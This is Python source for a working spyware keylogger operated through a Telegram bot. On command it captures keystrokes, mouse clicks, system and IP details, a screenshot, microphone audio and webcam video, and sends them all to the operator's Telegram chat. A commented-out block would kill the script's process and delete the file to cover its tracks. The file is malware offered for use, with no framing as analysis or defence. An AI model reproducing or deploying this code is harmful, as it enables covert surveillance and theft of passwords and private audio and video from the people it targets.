import logging
import os
import platform
import threading
import wave
import socket
import pyscreenshot
import sounddevice as sd
import cv2
import telebot
import time
 
from telebot.apihelper import ApiTelegramException
 
from pynput import keyboard, mouse
 
bot = telebot.TeleBot("Your Bot's Token", parse_mode=None)
 
 
def setup_logger():
    logger = logging.getLogger("kl")
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler("spam.log")
    fh.setLevel(logging.DEBUG)
    logger.addHandler(fh)
    return logger
 
 
logger = setup_logger()
 
 
class KeyLogger:
    def __init__(self, time_interval, message=None):
        self.interval = time_interval
        if message is not None:
            self.message = message
 
    def appendlog(self, log):
        logger.info(log)
 
    def listner_handler(self, x, y, button="", bool=False):
        self.appendlog(f"Mouse moved to {x} {y} {button} {bool}")
 
    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = str(key)
 
        self.appendlog(current_key)
 
    def send_logs(self):
        self.stop()
 
        with open("spam.log", "r+") as f:
            data = f.read()
            if data and self.message:
                bot.reply_to(self.message, data)
            f.seek(0)
            f.truncate()
 
        self.screenshot()
        self.microphone()
        self.record()
        
 
    def report(self):
        self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
        self.mouse_listener = mouse.Listener(on_click=self.listner_handler)
        self.keyboard_listener.start()
        self.mouse_listener.start()
 
        timer = threading.Timer(self.interval, self.send_logs)
        timer.start()
 
    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)
 
    def microphone(self):
        fs = 44100
        seconds = 10
        obj = wave.open("sound.wav", "w")
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()
        if self.message:
            bot.send_audio(self.message.chat.id, audio=open("sound.wav", "rb"))
 
    def screenshot(self):
        img = pyscreenshot.grab()
        img.save("screenshot.png")
        try:
            if self.message:
                bot.send_photo(self.message.chat.id, photo=open("screenshot.png", "rb"))
        except ApiTelegramException:
            self.appendlog("Screenshot not captured")
 
    def record(self):
        capture_duration = 10
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        out = cv2.VideoWriter("output.avi", fourcc, 20.0, (640, 480))
        start_time = time.time()
        while int(time.time() - start_time) < capture_duration:
            ret, frame = cap.read()
            if ret == True:
                frame = cv2.flip(frame, 1)
                out.write(frame)
            else:
                break
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        if self.message:
            bot.send_video(self.message.chat.id, video=open("output.avi", "rb"))\
 
    def stop(self):
        self.mouse_listener.stop()
        self.keyboard_listener.stop()
 
    def run(self):
        self.system_information()
        self.report()
 
        """ if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print("File was closed.")
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print("File is closed.")
 
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("pkill leafpad")
                os.system("chattr -i " + os.path.basename(__file__))
                print("File was closed.")
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print("File is closed.")"""
 
 
@bot.message_handler(commands=["start", "help", "check"])
def send_welcome(message):
    bot.reply_to(message, "Bot started / Bot Is Running")
 
 
@bot.message_handler(commands=["send", "fetch"])
def send_data(message):
    keylogger = KeyLogger(10, message)
    keylogger.run()
 
 
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Wrong Command")
 
 
bot.polling()
